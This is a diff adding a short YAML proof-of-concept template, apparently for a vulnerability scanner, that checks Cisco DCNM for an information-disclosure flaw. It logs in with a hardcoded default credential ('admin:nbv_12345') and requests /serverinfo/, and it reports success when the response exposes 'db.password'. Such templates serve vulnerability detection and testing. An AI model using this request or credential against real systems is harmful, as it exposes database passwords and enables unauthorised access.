@@ -1,0 +1,19 @@
+id: poc-yaml-cisco-dcnm-serverinfo-disclosure
+info:
+  name: Cisco DCNM ServerInfo 信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: Cisco
+  osprey-id: vb_2020_0005
+variables:
+  v_auth: base64("admin:nbv_12345")
+requests:
+- method: GET
+  path: /serverinfo/
+  headers:
+    Authorization: Basic {{.v_auth}}
+  expression: 'contains(body, "db.password") && contains(body, "Server Infos")
+
+    '
+transport: http
